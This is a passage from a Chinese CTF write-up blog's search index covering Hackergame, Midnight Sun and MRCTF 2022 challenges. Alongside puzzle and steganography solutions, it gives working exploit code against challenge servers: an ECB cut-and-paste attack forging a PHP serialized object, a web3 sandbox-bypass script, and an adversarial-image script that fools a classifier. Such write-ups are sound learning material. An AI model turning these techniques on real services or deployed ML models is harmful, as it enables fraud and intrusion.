self.b[i-1][j]\n                self.b[i-1][j] = 15\n            else:\n                self.b[i][j] = self.b[i+1][j]\n                self.b[i+1][j] = 15\n\n    def __bool__(self):\n        for i in range(4):\n            for j in range(4):\n                if self.b[i][j] != i*4 + j:\n                    return True\n        return False\n\nwith open(\"chals/b16_obf.json\") as f:\n    branches = json.load(f)\n\nb = Board()\nstart = ...\nend = ...\nfor i in tqdm(range(start, end)):\n    b.reset()\n    bits = bin(i)[2:].zfill(16)\n    for branch in branches:\n        b.move(branch[1] if bits[branch[0]] == '1' else branch[2])\n    if b:\n        print(bits)\n        break\n</code></pre> \u7206\u7834\u51fa\u7ed3\u679c\u4e3a 0010111110000110\uff0cflag\uff1aflag{Branching_Programs_are_NC1_\u2026\u2026}</p> <p>\u7b2c\u4e09\u90e8\u5206\u592a\u590d\u6742\u4e86\uff0c\u5e94\u8be5\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u6bd5\u7adf\u8fd9\u662f\u4e00\u9053 math \u9898\uff0c\u5f00\u6446\u3002</p>"}, {"location": "writeups/hackergame2022/#e", "title": "\u706b\u773c\u91d1\u775b\u7684\u5c0f E", "text": "<p>\u5c0f E \u6709\u5f88\u591a\u7684 ELF \u6587\u4ef6\uff0c\u5b83\u4eec\u91cc\u9762\u7684\u51fd\u6570\u6709\u70b9\u50cf\uff0c\u80fd\u628a\u5b83\u4eec\u5339\u914d\u8d77\u6765\u5417\uff1f</p> <p>\u5c0f A\uff1a\u8fd9\u4e0d\u662f\u7528 BinDiff \u5c31\u53ef\u4ee5\u4e86\u5417\uff0c\u5f88\u7b80\u5355\u5427\uff1f</p> <p>\u53ea\u505a\u4e86\u53f3\u624b\u5c31\u884c\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u4e24\u6b21\u8fbe\u5230 100% \u6b63\u786e\u3002\u62d6\u8fdb IDA \u4e2d\u786c\u770b\uff0c\u627e CFG \u56fe\u4ee5\u53ca\u6c47\u7f16\u4ee3\u7801\u6bd4\u8f83\u7c7b\u4f3c\u7684\u51fd\u6570\u5373\u53ef\uff0c\u65f6\u9650\u4e5f\u5f88\u957f\uff0c\u4e0d\u7528\u7740\u6025\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u627e\u5230\u76f8\u4f3c\u7684\u51fd\u6570\u3002\u63d0\u4ea4\u62ff\u5230 flag\uff1aflag{easy_to_use_bindiff_\u2026\u2026} \uff08\u7b11\u6b7b\uff0c\u6839\u672c\u6ca1\u7528 bindiff\uff09</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8981\u6c42\u4e00\u4e2a\u5c0f\u65f6\u5185\u5b8c\u6210 100 \u9898\u4e2d\u7684 40 \u9898\uff0c\u7b2c\u4e09\u90e8\u5206\u8981\u6c42\u4e09\u5c0f\u65f6\u5185\u5b8c\u6210 200 \u9898\u4e2d\u7684 60 \u9898\uff0c\u4e0d\u60f3\u505a\uff0c\u5f00\u6446\u3002</p>"}, {"location": "writeups/midnight2023/", "title": "Midnight Sun CTF 2023 Quals Writeup", "text": "<p> \u7ea6 148 \u4e2a\u5b57  20 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u6bd4\u8d5b\u533a\u5206\u5ea6\u5f88\u5c0f\uff0c\u53ea\u5dee\u4e00\u9053\u9898 AK \u4f46\u62cd\u4e86\u7b2c\u5341\u6ca1\u8fdb\u51b3\u8d5b\u3002</p> <p>\u505a\u4e86\u51e0\u4e2a misc \u8fd8\u53ef\u4ee5\u3002</p>"}, {"location": "writeups/midnight2023/#whistle", "title": "whistle", "text": "<p>\u4e00\u4e2a\u86ee\u5927\u7684\u6587\u4ef6\uff0c\u5185\u5bb9\u5f00\u5934\uff1a</p> <pre><code>G00 S1;\nG00 E0;\nG01 S1;\nG01 E0;\nG21;\nG91 G0 F300.0 Z20.000;\nG90;\nG28 X;\nG28 Y;\nG28 Z;\nG00 F300.0 Z35.000;\nG00 F2400.0 Y0.000;\nG00 F2400.0 X0.000;\nG00 F2400.0 X170.045 Y109.968;\nG00 F300.0 Z15.000;\nG01 F2100.0 X169.464 Y109.947;\nG01 F2100.0 X169.158 Y109.883;\nG01 F2100.0 X168.900 Y109.777;\nG01 F2100.0 X168.692 Y109.628;\nG01 F2100.0 X168.530 Y109.444;\n</code></pre> <p>\u8fd8\u633a\u6709\u7279\u5f81\uff0c\u641c\u4e00\u4e0b\u662f\u6570\u63a7\u7f16\u7a0b\u7684 G-code\uff0c\u624b\u5199\u4e0d\u592a\u73b0\u5b9e\uff0c\u53ef\u4ee5\u641c\u5230 simulator: https://ncviewer.com/\uff0c\u8dd1\u4e00\u4e0b\uff1a</p> <p></p> <p>\u6709\u5f88\u591a redacted\uff0c\u5e94\u8be5\u662f\u65e0\u7528\u4fe1\u606f\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e9b _? \u7b49\u5b57\u7b26\u5e94\u8be5\u662f flag\uff0c\u52a8\u6001\u7ed8\u5236\u4e00\u4e0b\uff0c\u9664\u6389 redacted \u76f8\u5173\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u5f97\u5230\u5e72\u5e72\u51c0\u51c0\u7684\uff1a</p> <p></p> <p>flag: midnight{router_hacking?}</p> <p>\u8fd8\u6709\u4e24\u9053\u6211\u90fd\u53ea\u53c2\u4e0e\u4e86\u4e00\u90e8\u5206\uff0c\u8fd8\u662f\u4e0d\u5199\u4e86\uff08</p>"}, {"location": "writeups/mrctf2022/", "title": "MRCTF 2022 Writeup", "text": "<p> \u7ea6 928 \u4e2a\u5b57  424 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u53d7\u9ad8\u4e2d\u5b66\u957f\u9080\u8bf7\u6765\u6253\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u8d28\u91cf\u5f88\u9ad8\uff0c\u6253\u7684\u5f88\u723d\uff0c\u961f\u91cc\u5927\u624b\u5b50\u5f3a\u7684\u5f88\uff0c\u5e26\u7740\u62ff\u4e86\u7b2c\u4e00 </p> <p>misc \u6709\u4e00\u9053\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u770b\u4e86 nano \u7684 wp \u540e\u8865\u51fa\u6765\u4e86\uff0c\u8fd9\u6b21\u6bd4\u8d5b\u4e5f\u53c2\u4e0e\u4e86\u4e00\u4e0b eth \u9898\u76ee</p>"}, {"location": "writeups/mrctf2022/#readlongnovel", "title": "ReadLongNovel", "text": "<p>\u7531\u4e8e\u65f6\u95f4\u591f\u957f\u3001\u9898\u5e93\u4e0d\u5927\uff0c\u6240\u4ee5\u76f4\u63a5\u7f51\u7edc\u641c\u7d22 + \u539f\u6587 txt \u641c\u7d22\u5c31\u53ef\u4ee5\u624b\u52a8\u641e\u5dee\u4e0d\u591a</p> <p>flag: MRCTF{\u613f\u60a8\u7684+\u6587\u660e+\u6c38\u8fdc\u8fdb\u6b65}</p>"}, {"location": "writeups/mrctf2022/#connecting", "title": "Connecting...", "text": "<p>obj \u6709\u4e2a\u6570\u636e\u4e0d\u6539\u7684\u8bdd blender \u52a0\u8f7d\u4e0d\u51fa\u6765\uff084d33 \u4e0d\u662f\u5341\u8fdb\u5236\u6570\uff09</p> <p>\u7136\u540e\u53d1\u73b0\u6240\u6709 f \u90fd\u662f / \u5206\u9694\u7684\u4e09\u4e2a\u6570\u76f8\u540c\uff0c\u53ea\u6709\u8fd9\u4e00\u884c\u4e0d\u76f8\u540c</p> <p></p> <pre><code>&gt;&gt;&gt; for each in [0x4d, 0x33, 0x52, 0x37, 0x61, 0x49, 0x63, 0x54, 0x46]:\n...     print(chr(each), end=\"\")\n...\nM3R7aIcTF\n</code></pre> <p>\u56fe\u7247\u5f00\u5934 xml \u4fe1\u606f\u4e2d\u53d1\u73b0\uff1aThank Fabien Petitcolas For his work.</p> <p>\u641c\u5230 mp3stego\uff0c\u7528\u5b83\u548c\u5bc6\u7801 <code>M3R7aIcTF</code> \u6765\u89e3\u5bc6 wav \u6587\u4ef6\uff08\u5176\u5b9e\u662f mp3\uff09\u5f97\u5230\uff1a</p> <pre><code>FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I\n</code></pre> <p>base32\uff1a <code>(M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!}</code></p> <p>flag: MRCTF{WIFI_2022_connect_successfully!}</p>"}, {"location": "writeups/mrctf2022/#pixel", "title": "Pixel", "text": "<p>blue plane \u770b\u8d77\u6765\u5f88\u6709\u95ee\u9898\uff0c\u628a 512 \u5f20\u56fe\u7247\u7684\u6240\u6709\u70b9\u70b9\u53e0\u52a0\uff08blue \u5404\u4e2a plane \u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u662f blue 3\uff09</p> <p></p> <p>\u518d\u6839\u636e hint \u76f4\u63a5\u641e\u5230\u539f\u56fe\uff1a</p> <pre><code>img2 = Image.new(\"RGB\", (512, 512))\nfor i in range(512):\n    for j in range(512):\n        img2.putpixel((i, j), (255, 255, 255))\nfor n in tqdm(range(512)):\n    img = Image.open(f\"pixel/{n}.png\")\n    width, height = img.size\n    for i in range(width):\n        for j in range(height):\n            R, G, B = pix = img.getpixel((i, j))\n            if B != 255:\n                img2.putpixel((i,j), pix)\nimg2.save(f\"zigzag.png\")\n</code></pre> <p></p> <p>red plane 0 \u6709\u95ee\u9898</p> <p></p> <p>\u6839\u636e zigzag \u63a8\u6d4b\u9700\u8981\u8fdb\u884c\u4e00\u4e9b zigzag \u64cd\u4f5c\uff08\u5373\u50cf\u7d20\u70b9\u987a\u5e8f\u7684\u8f6c\u6362\uff09\u7f51\u4e0a\u627e\u627e\u4ee3\u7801\u6539\u4e00\u6539</p> zigzag <pre><code>from PIL import Image\nimport numpy as np\n\ndef zigzag(data):\n    row = data.shape[0]\n    col = data.shape[1]\n    num = row * col\n    lst = np.zeros(num,)\n    k = 0\n    i = 0\n    j = 0\n\n    while i &lt; row and j &lt; col and k &lt; num:\n        lst[k] = data.item(i, j)\n        k = k + 1\n        if (i + j) % 2 == 0:\n            if (i-1) in range(row) and (j+1) not in range(col):\n                i = i + 1\n            elif (i-1) not in range(row) and (j+1) in range(col):\n                j = j + 1\n            elif (i-1) not in range(row) and (j+1) not in range(col):\n                i = i + 1\n            else:\n                i = i - 1\n                j = j + 1\n        elif (i + j) % 2 == 1:\n            if (i+1) in range(row) and (j-1) not in range(col):\n                i = i + 1\n            elif (i+1) not in range(row) and (j-1) in range(col):\n                j = j + 1\n            elif (i+1) not in range(row) and (j-1) not in range(col):\n                j = j + 1\n            else:\n                i = i + 1\n                j = j - 1\n    return lst\n\ndef dezigzag(data):\n    num = len(data)\n    row = int(num ** 0.5)\n    col = int(num ** 0.5)\n    lst = np.zeros((row, col))\n    k = 0\n    i = 0\n    j = 0\n\n    while i &lt; row and j &lt; col and k &lt; num:\n        lst[i][j] = data[k]\n        k = k + 1\n        if (i + j) % 2 == 0:\n            if (i-1) in range(row) and (j+1) not in range(col):\n                i = i + 1\n            elif (i-1) not in range(row) and (j+1) in range(col):\n                j = j + 1\n            elif (i-1) not in range(row) and (j+1) not in range(col):\n                i = i + 1\n            else:\n                i = i - 1\n                j = j + 1\n        elif (i + j) % 2 == 1:\n            if (i+1) in range(row) and (j-1) not in range(col):\n                i = i + 1\n            elif (i+1) not in range(row) and (j-1) in range(col):\n                j = j + 1\n            elif (i+1) not in range(row) and (j-1) not in range(col):\n                j = j + 1\n            else:\n                i = i + 1\n                j = j - 1\n    return lst\n\ndef ZigZag(data):\n    lst = zigzag(data)\n    k = 0\n    ret = np.zeros(data.shape)\n    row, col = data.shape\n    for i in range(row):\n        for j in range(col):\n            ret[i][j] = lst[k]\n            k += 1\n    return ret\n\ndef deZigZag(data):\n    lst = []\n    row, col = data.shape\n    for i in range(row):\n        for j in range(col):\n            lst.append(data[i][j])\n    ret = dezigzag(lst)\n    return ret\n\nimg = Image.open(\"XXX\").convert(\"L\")\narr = np.array(img)\n#for i in range(64):\n    #for j in range(64):\n        # arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8])\n        #arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8])\narr[0:512,0:512] = deZigZag(arr[0:512, 0:512])\nimg2 = Image.fromarray(arr, \"L\")\nimg2.show()\nimg2.save(\"XXX\")\n</code></pre> <p></p> <p>\u660e\u663e\u662f\u732b\u56fe\u7b97\u6cd5\uff0c\u53c2\u6570 20 22</p> cat map <pre><code>import os\n\nfrom PIL.Image import open as load_pic, new as new_pic\n\ndef main(path, iterations, keep_all=False, name=XXX):\n    title = os.path.splitext(os.path.split(path)[1])[0]\n    ppath=path\n    counter = 0\n    while counter &lt; iterations:\n        with load_pic(path) as image:\n            dim = width, height = image.size\n            with new_pic(image.mode, dim) as canvas:\n                for x in range(width):\n                    for y in range(height):\n                        nx = (441 * x + 20 * y) % width\n                        ny = (22 * x + 1 * y) % height\n                        canvas.putpixel((nx, height-ny-1), image.getpixel((x, height-y-1)))\n        if counter &gt; 0 and not keep_all:\n            os.remove(path)\n        counter += 1\n        print(counter, end=\"\\r\")\n        path = name.format(name=title, index=counter)\n        canvas.save(path)\n\n    return canvas\n\nresult = main(XXX, 512, True)\nresult.show()\n</code></pre> <p></p> <p>flag: MRCTF{f8e49887132bf8977a161472781b718c}</p>"}, {"location": "writeups/mrctf2022/#spy_dog", "title": "Spy_Dog", "text": "<p>\u8981\u6c4299.9%\u7684\u6982\u7387\u8bc6\u522b\u6210\u732b\u3002</p> <p>\u7528\u68af\u5ea6\u53cd\u5411\u4f20\u64ad\u8bad\u7ec3\u7f51\u7edc\u53c2\u6570\u7684\u65b9\u5f0f\u8bad\u7ec3\u56fe\u7247\u5373\u53ef\uff0c\u4ee3\u7801\u76f4\u63a5\u6284\u7f51\u4e0a\u7684\uff1ahttps://www.likecs.com/show-915984.html</p> <p>\u7531\u4e8e\u53d6\u6574\u5e26\u6765\u7684\u95ee\u9898\uff0c\u8bad\u7ec3\u5f97\u5230\u7684\u51c6\u786e\u7387\u8981\u6bd4\u8981\u6c42\u9ad8\u4e00\u70b9</p> exp <pre><code># %%\nfrom keras.models import load_model\nimport cv2\nimport numpy as np\nfrom keras.preprocessing import image\nfrom keras.applications import inception_v3\nfrom keras import backend as K\nfrom PIL import Image\nimport tensorflow as tf\ntf.compat.v1.disable_eager_execution()\n\n# %%\nmodel = load_model(\"simplenn.model\")\n\n# %%\n# Grab a reference to the first and last layer of the neural net\nmodel_input_layer = model.layers[0].input\nmodel_output_layer = model.layers[-1].output\n\nobject_type_to_fake = 1\n\n# Load the image to hack\nimg = cv2.imread(\"dog.bmp\")\noriginal_image = img.astype(np.float32)\n\n# Scale the image so all pixel intensities are between [-1, 1] as the model expects\noriginal_image /= 255.\n\n# Add a 4th dimension for batch size (as Keras expects)\noriginal_image = np.expand_dims(original_image, axis=0)\n\n# Pre-calculate the maximum change we will allow to the image\n# We\\'ll make sure our hacked image never goes past this so it doesn\\'t look funny.\n# A larger number produces an image faster but risks more distortion.\nmax_change_above = original_image + (9.4/255.)\nmax_change_below = original_image - (9.4/255.)\n\n# Create a copy of the input image to hack on\nhacked_image = np.copy(original_image)\n\n# How much to update the hacked image in each iteration\nlearning_rate = 0.1\n\n# Define the cost function.\n# Our \\'cost\\' will be the likelihood out image is the target class according to the pre-trained model\ncost_function = model_output_layer[0, object_type_to_fake]\n\n# We\\'ll ask Keras to calculate the gradient based on the input image and the currently predicted class\n# In this case, referring to \"model_input_layer\" will give us back image we are hacking.\ngradient_function = K.gradients(cost_function, model_input_layer)[0]\n\n# Create a Keras function that we can call to calculate the current cost and gradient\ngrab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])\n\ncost = 0.0\n\n# In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more\n# until it gets to at least 80% confidence\nwhile cost &lt; 0.9995:\n    # Check how close the image is to our target class and grab the gradients we\n    # can use to push it one more step in that direction.\n    # Note: It\\'s really important to pass in \\'0\\' for the Keras learning mode here!\n    # Keras layers behave differently in prediction vs. train modes!\n    cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0])\n\n    # Move the hacked image one step further towards fooling the model\n    hacked_image += gradients * learning_rate\n\n    # Ensure that the image doesn\\'t ever change too much to either look funny or to become an invalid image\n    hacked_image = np.clip(hacked_image, max_change_below, max_change_above)\n    hacked_image = np.clip(hacked_image, -1.0, 1.0)\n\n    print(\"Model\\'s predicted likelihood that the image is a cat: {:.8}%\".format(cost * 100))\n\n# De-scale the image\\'s pixels from [-1, 1] back to the [0, 255] range\nimg = hacked_image[0].copy()\nimg *= 255.\n\n# Save the hacked image!\ncv2.imwrite('hacked.bmp', img.astype(np.uint8))\n\n# %% check\nmodel = load_model(\"simplenn.model\")\n\ndef checkMask(model, img):\n    predict = model.predict(img)\n    return predict[0][1]\n\ndef checkSkin(img1, img2):\n    output = []\n    for i in range(0, len(img1)):\n        for j in range(0, len(img1[i])):\n            output.append(img2[i][j]-img1[i][j])\n    maxnum = 0\n    for i in output:\n        num = 0\n        for j in i:\n            if j &gt;= 200:\n                j = 255 - j\n            num = j\n            if num &gt;= maxnum:\n                maxnum = num\n                index = i\n    print(index)\n    print(maxnum)\n    if maxnum &gt; 10:\n        return 0\n    else:\n        return 1\n\nscore = 0\nimg = cv2.imread('hacked.bmp')\nscore += checkSkin(img, cv2.imread(\"dog.bmp\"))\nimg = cv2.resize(img, (128, 128))\nimg_tensor = np.expand_dims(img, axis=0)\nimg_tensor = img_tensor.astype(np.float32)\nimg_tensor /= 255.\nscore += checkMask(model, img_tensor)\nprint(score)\n</code></pre> <p>flag: MRCTF{A_D0g_W1th_Br1lli4nt_Tric7}</p>"}, {"location": "writeups/mrctf2022/#pdd", "title": "pdd", "text": "<p>\u65e0\u6cd5\u4f2a\u9020 ip \u8fdb\u884c\u52a9\u529b\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u8d8b\u8fd1 100 \u800c\u4e0d\u4f1a\u7b49\u4e8e</p> <p>\u6ce8\u610f\u5230\u9664\u88ab\u52a9\u529b\u6b21\u6570\u4ee5\u5916\u7684\u6570\u636e\u90fd\u662f\u5b58\u5728\u5ba2\u6237\u7aef\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e0a\u7684\uff0c\u5c1d\u8bd5\u63a7\u5236 name \u751f\u6210\u51fa\u76ee\u6807 enc \u5373\u53ef\uff08\u53ef\u5728 debug \u4e0a\u770b\u5230\u89e3\u5bc6\u7ed3\u679c\uff09</p> <p>\u7b80\u5355\u5c1d\u8bd5\u53ef\u77e5\u52a0\u5bc6\u662f\u5e26 pad \u7684\u6bcf 16 \u5b57\u8282\u8fdb\u884c ECB \u52a0\u5bc6\u7684\u672a\u77e5\u52a0\u5bc6\u3002\uff08\u7c7b\u4f3c AES-256-ECB\uff09</p> <pre><code>let enc1 = await fetch(\"https://ppd.node3.mrctf.fun/lucky.php?action=start\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": JSON.stringify({username: 'user_tpHRGt11111111111111'}),\n  \"method\": \"POST\"\n}).then(x =&gt; x.json()).then(x =&gt; x.enc);\n\nlet enc2 = await fetch(\"https://ppd.node3.mrctf.fun/lucky.php?action=start\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": JSON.stringify({username: '111111111111' + 'O:4:\"User\":3:{s:8:\"username\";s:22:\"user_tpHRGt11111111111\";s:5:\"times\";i:110;s:5:\"money\";d:100;}'}),\n  \"method\": \"POST\"\n}).then(x =&gt; x.json()).then(x =&gt; x.enc);\n\nfetch(\"https://ppd.node3.mrctf.fun/lucky.php?action=getFlag\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": JSON.stringify({enc: btoa(atob(enc2).slice(48).slice(0, target.length)+atob(enc1).slice(-16))}),\n  \"method\": \"POST\"\n}).then(x =&gt; x.json()).then(x =&gt; {\n    console.log(x.flag);\n})\n</code></pre> <p>flag: MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!}</p>"}, {"location": "writeups/mrctf2022/#sandsandsand", "title": "SandSandSand", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.7.0;\n\ncontract checktheCode {\n    function checks(address a) public {\n        uint256 size;\n        assembly {\n            size := extcodesize(a)\n        }\n        require(size &lt; 0x10);\n    }\n}\n\ncontract BabySandbox {\n    event SendFlag(address);\n    checktheCode public A;\n\n    constructor() public {\n        A = new checktheCode();\n    }\n\n    function run(address code) external payable {\n        bool success;\n        bytes memory result;\n        (success, result) = address(A).call(\n            abi.encodeWithSignature(\"checks(address)\", code)\n        );\n        require(success == true);\n        assembly {\n            if eq(caller(), address()) {\n                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)\n                case 0 {\n                    returndatacopy(0x00, 0x00, returndatasize())\n                    revert(0x00, returndatasize())\n                }\n                case 1 {\n                    returndatacopy(0x00, 0x00, returndatasize())\n                    return(0x00, returndatasize())\n                }\n            }\n\n            if lt(gas(), 0xB000) {\n                revert(0x00, 0x00)\n            }\n\n            calldatacopy(0x00, 0x00, calldatasize())\n\n            if eq(staticcall(0x5000, address(), 0, calldatasize(), 0, 0), 1) {\n                revert(0x00, 0x00)\n            }\n\n            if eq(call(0x5000, address(), 0, 0, calldatasize(), 0, 0), 0) {\n                revert(0x00, 0x00)\n            }\n        }\n        emit SendFlag(msg.sender);\n    }\n}\n</code></pre> <p>\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u5c31\u662f\u8981\u7528 0x5000 \u7684 gas \u8c03\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5408\u7ea6\uff0c\u8981\u6c42 staticcall \u8c03\u7528\u4f1a\u5931\u8d25\uff0ccall \u4f1a\u6210\u529f\uff0c\u5e76\u4e14\u5408\u7ea6\u5b57\u8282\u7801\u5728 0x10 \u4ee5\u5185</p> <p>\u76f4\u63a5\u5728\u5408\u7ea6\u4e2d\u6267\u884c\u4e00\u6b21 sstore \u5c31\u53ef\u4ee5\u8ba9 staticcall \u6302\u6389\uff0cyul \u5408\u7ea6\uff1a</p> <pre><code>object \"DeleCaller\" {\n  code {\n    sstore(0, 0)\n    datacopy(0, dataoffset(\"Runtime\"), datasize(\"Runtime\"))\n    return(0, datasize(\"Runtime\"))\n  }\n  object \"Runtime\" {\n    code {\n      sstore(0, 0)\n      stop()\n    }\n  }\n}\n</code></pre> <p>\u6216\u8005\u624b\u5199\u6c47\u7f16\uff1a</p> <pre><code>; \u524d\u9762\u5957\u4e00\u5c42 creationCode\nPUSH1 0x00 ; 6000\nPUSH1 0x00 ; 6000\nSSTORE     ; 55\nSTOP       ; 00\n</code></pre> exp <pre><code>from web3 import Web3\n\nw3 = Web3(Web3.HTTPProvider('http://retr0.vip:8545'))\n\nhacker = '...'\ntarget = '...'\nprivateKey = '...'\n\ndef get_txn(src, dst, data, value=0, gas=0x200000):\n    return {\n        \"chainId\": 0x4bb,\n        \"from\": src,\n        \"to\": dst,\n        \"gasPrice\": w3.toWei(1.1, 'gwei'),\n        \"gas\": gas,\n        \"value\": w3.toWei(value, 'ether'),\n        \"nonce\": w3.eth.getTransactionCount(src),\n        \"data\": data\n    }\n\ndata = get_txn(hacker, None, bytes.fromhex(\"60006000556006601160003960066000f3600060005500\"))\ntransaction = w3.eth.account.signTransaction(data, privateKey).rawTransaction\ntxn_hash = w3.eth.sendRawTransaction(transaction).hex()\ntxn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\nprint(txn_receipt)\n\ncontractAddress = txn_receipt['contractAddress']\n\ndata = get_txn(hacker, target, bytes.fromhex(\"522bb704000000000000000000000000\" + contractAddress[2:]))\ntransaction = w3.eth.account.signTransaction(data, privateKey).rawTransaction\ntxn_hash = w3.eth.sendRawTransaction(transaction).hex()\ntxn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\nprint(txn_receipt)\n</code></pre> <p>flag: MRCTF{TheShor7testShel1c0dE&amp;EIP-2929}</p>"}, {"location": "writeups/mrctf2022/#jop_gadget", "title": "JOP_Gadget", "text": "<p>\u9898\u76ee\u7684\u610f\u601d\u5c31\u662f\u4f1a\u5148\u628a\u8f93\u5165 PUSH2 \u8fdb\u53bb\uff0c\u7136\u540e\u6267\u884c\uff0c\u5f00\u5934\u4f1a\u5148 JUMP</p> <p>\u770b\u5230\u51fa\u9898\u4eba\u7ed9\u7684\u6570\u636e\u89e3\u6790\u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6</p> <p></p> <p>\u6240\u4ee5\u5982\u679c\u8f93\u5165\u7684\u957f\u5ea6\u5e76\u4e0d\u662f uint16\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5c31\u4f1a\u88ab\u5f53\u6210\u6b63\u5e38\u7684\u5b57\u8282\u7801\u6765\u8fd0\u884c\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u4e00\u4e2a 16 \u4f4d padding \u540e\u9762\u63a5\u4e0a\u6b63\u5e38\u8fd4\u56de 1 \u7684\u5b57\u8282\u7801\u5c31\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u76f4\u63a5\u8fd4\u56de 1</p> <p>\u4f8b\u5982 <code>0x123450600160805260206080f300</code> \u4e5f\u5c31\u53d8\u6210\u4e86\uff1a <pre><code>PUSH2 1234\nPOP\nPUSH1 0x01\nPUSH1 0x80\nMSTORE\nPUSH1 0x20\nPUSH1 0x80\nRETURN\nSTOP\n</code></pre></p> <p>flag: MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&amp;F0under}</p>"}, {"location": "writeups/mrctf2022/#bleach", "title": "Bleach!", "text": "<p>\u8d5b\u540e\u8865\u505a\u7684\u9898</p> <p>\u6d41\u91cf\u5206\u6790\u770b\u5230\u4e00\u5806 UDP \u534f\u8bae\u548c OICQ \u534f\u8bae</p> <p>\u5728\u8d5b\u540e\u770b\u4e86 nano \u7684 wp \u540e\u77e5\u9053\u90a3\u4e00\u5927\u5806 UDP \u662f\u5728 UDP \u57fa\u7840\u4e0a\u7684 RTP \u534f\u8bae\uff0c\u8981\u5728 wireshark \u91cc decode as RTP \u624d\u80fd\u663e\u793a\u4e3a RTP \u6d41</p> <p>\u7136\u540e\u901a\u8fc7 wireshark \u7684 RTP \u6d41\u64ad\u653e\u5668\u5bfc\u51fa\u97f3\u9891 raw \u6587\u4ef6\uff0c\u5728 Au \u4e2d\u6253\u5f00\uff0c\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u7684\u63d0\u793a\uff0c\u5e94\u8be5\u662f 44100Hz\u300116 \u4f4d PCM \u7f16\u7801\uff0c\u6253\u5f00\u540e\u53ef\u4ee5\u542c\u5230\u6e05\u6670\u6b4c\u66f2\u58f0\u97f3</p> <p>\u518d\u7531\u9898\u76ee\u63cf\u8ff0\u4e2d\u7684 picture in music \u60f3\u5230 lsb\uff0c\u4ee5\u53ca 400*400 \u7684\u56fe\u7247\u5927\u5c0f\u3002\u6240\u4ee5\u5b58\u4e3a wav \u540e\u8bfb\u53d6\uff0c\u63d0\u53d6 lsb \u8f6c\u4e3a\u56fe\u7247</p> <p>\u56e0\u4e3a\u5b58\u4e0b\u6765\u7684 wav \u662f 16 \u4f4d\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u89c6\u4e3a\u4e24\u4e2a 8 \u4f4d\u6574\u6570\uff0c\u5206\u522b\u63d0\u53d6 lsb\uff0c\u4e00\u5171\u9700\u8981 400*400/2 \u5e27\uff1a</p> exp <pre><code>import wave\nfrom PIL import Image\n\nf = wave.open(\"bleach.wav\", \"rb\")\n\nframes = f.readframes(400*400//2)\nres = [255 if frame &amp; 1 else 0 for frame in frames]\n\nimg = Image.new(\"L\", (400, 400))\nk = 0\nfor i in range(400):\n    for j in range(400):\n        img.putpixel((j, i), res[k])\n        k += 1\nimg.show()\nimg.save(\"flag.png\")\n</code></pre> <p></p> <p>flag: MRCTF{Don\u2019t_Use_Your_tools!}</p>"}, {"location": "writeups/n1ctf2022/", "title": "N1CTF 2022 Writeup", "text": "<p> \u7ea6 2683 \u4e2a\u5b57  838 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u6b21\u4e3b\u8981\u505a\u4e86\u4e0b blockchain\uff0cmisc \u6709\u4e2a\u5185\u5b58\u53d6\u8bc1\u5dee\u4e00\u70b9\u505a\u51fa\u6765\uff0c\u4e5f\u5728\u8fd9\u91cc\u8bb0\u4e00\u4e0b</p> <p>\u542c\u8bf4\u8fd9\u6b21\u7684 blockchain \u4f1a\u8bbe\u5355\u9879\u5956\uff0c\u5e94\u8be5\u5f88\u6709\u8d28\u91cf\u3002\u6ca1\u60f3\u5230\u662f\u6ca1\u63a5\u89e6\u8fc7\u7684 solana \u533a\u5757\u94fe\uff0c\u7b2c\u4e00\u6b21\u73a9\uff0c\u8fd8\u633a\u6709\u610f\u601d\u7684\uff0c\u800c\u4e14\u9898\u7ed9\u7684\u505a\u9898\u6846\u67b6\u4e5f\u5f88\u5168\uff0c\u8fd8\u7b97\u5f88\u8212\u9002</p> <p>\u611f\u89c9 solana 